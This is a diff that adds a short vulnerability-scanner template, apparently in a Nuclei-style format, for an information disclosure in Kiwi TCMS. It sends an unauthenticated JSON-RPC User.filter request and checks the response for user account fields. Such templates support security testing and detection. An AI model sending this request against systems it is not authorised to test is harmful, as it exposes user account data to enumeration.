@@ -1,0 +1,32 @@
+id: kiwitcms-json-rpc
+brief:
+    title: Kiwi TCMS Information Disclosure
+    by: act1on3
+    level: high
+    about: Internal info exposed in Kiwi TCMS.
+    label:
+        - kiwitcms
+        - exposure
+        - misconfig
+        - hackerone
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/json-rpc/'
+      head:
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+      body: '{"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - result
+            - username
+            - jsonrpc
+            - is_active
+          in: body
+          need: all
